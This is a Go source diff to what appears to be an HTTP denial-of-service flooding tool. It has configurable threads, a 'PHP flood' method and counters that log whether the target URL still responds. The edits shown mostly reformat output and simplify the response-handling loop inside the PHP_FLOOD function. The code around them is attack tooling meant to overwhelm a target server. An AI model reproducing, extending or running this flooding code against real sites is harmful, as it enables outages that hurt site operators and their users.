@@ -128,7 +128,7 @@ func main() {
 		fmt.Println("Log only down     = " + SHOWONLYDOWN)
 	} else if strings.ToLower(FloodMethod) == "php" {
 		fmt.Println("PHP URL          = " + URL)
-		fmt.Printf("Threads          = %d \n", Threads)
+		fmt.Printf("Threads          = %d \n\n", Threads)
 		fmt.Println("Log only down    = " + SHOWONLYDOWN)
 	}
 	fmt.Print("============================================================= \n")
@@ -154,12 +154,14 @@ func main() {
 	c := make(chan os.Signal)
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 	var StartedAt = time.Now()
+
 	for {
 		<-c
 
 		fmt.Print("\n\n\n=============================================================\n")
 
-		fmt.Println("Runtime                  - ", time.Now().Sub(StartedAt))
+		fmt.Println("Used flood method        - ", FloodMethod)
+		fmt.Println("Runtime                  - ", time.Now().Sub(StartedAt), "\n")
 		fmt.Println("Done rCode:200 requests  - ", FinishDone200)
 		fmt.Println("Dome rCode!200 requests  - ", FinishNot200)
 		fmt.Println("request summary          - ", FinishDone200+FinishNot200)
@@ -252,26 +254,24 @@ func PHP_FLOOD(URL string, OnlyDown string, PHPnames []string, PHPbodies []strin
 		if err != nil {
 			NotResponded(URL)
 		} else {
-			if err == nil {
-				if resp.StatusCode == 200 {
-					FinishDone200++
-					if strings.ToLower(OnlyDown) == "n" {
-						if strings.ToLower(ShowOutput) == "y" {
+			if resp.StatusCode == 200 {
+				FinishDone200++
+				if strings.ToLower(OnlyDown) == "n" {
+					if strings.ToLower(ShowOutput) == "y" {
 
-							info, err := io.ReadAll(resp.Body)
-							if err == nil {
-								log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200, " | ", string(info))
-							}
-						} else {
-							log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200)
+						info, err := io.ReadAll(resp.Body)
+						if err == nil {
+							log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200, " | ", string(info))
 						}
+					} else {
+						log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200)
 					}
-				} else {
-					FinishNot200++
-					log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200)
 				}
-				LastRespond = time.Now()
+			} else {
+				FinishNot200++
+				log.Println("[ "+URL+" ] - OK - ", resp.StatusCode, " | ", FinishDone200+FinishNot200)
 			}
+			LastRespond = time.Now()
 		}
 	}
 }
